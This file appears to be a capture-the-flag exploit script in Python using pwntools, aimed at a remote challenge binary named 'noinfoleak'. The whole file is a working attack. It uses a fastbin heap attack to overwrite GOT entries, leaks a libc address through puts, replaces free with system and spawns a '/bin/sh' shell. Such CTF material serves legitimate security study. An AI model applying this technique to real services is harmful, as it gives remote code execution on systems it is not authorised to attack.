from pwn import *
context.log_level = "debug"
# p = process("./noinfoleak")
p = remote("ctf1.linkedbyx.com" , 10216)
elf = ELF("./noinfoleak")
libc = elf.libc

sla = lambda c : p.sendlineafter(">" , str(c))
sa = lambda c : p.sendafter(">" , str(c))

def add(size , content):
	sla(1)
	sla(size)
	sa(content)

def delete(idx):
	sla(2)
	sla(idx)

def edit(idx , content):
	sla(3)
	sla(idx)
	sa(content)

# fastbin attack to control note_list 
stdin = 0x601090
add(0x60 , "padding")
add(0x60 , "padding")
add(0x60 , "padding")
add(0x60 , "/bin/sh\x00")

delete(0)
edit(0 , p64(stdin + 5 - 0x8))
add(0x60 , "padding") # clear
payload = "a" * 3 + p64(elf.got["free"]) + p64(0x8) + p64(elf.got["read"])  + p64(0x8)
add(0x60 , payload)
edit(0 , p64(elf.plt["puts"] + 6))
delete(1)
read_addr = u64(p.recvuntil("\x7f").ljust(8 , "\x00"))
libc.address = read_addr - libc.sym["read"]
log.info("libc : " + hex(libc.address))
edit(0 , p64(libc.sym["system"]))
delete(3)
# gdb.attach(p)
# leak libc 
# modify free to system for getshell

p.interactive()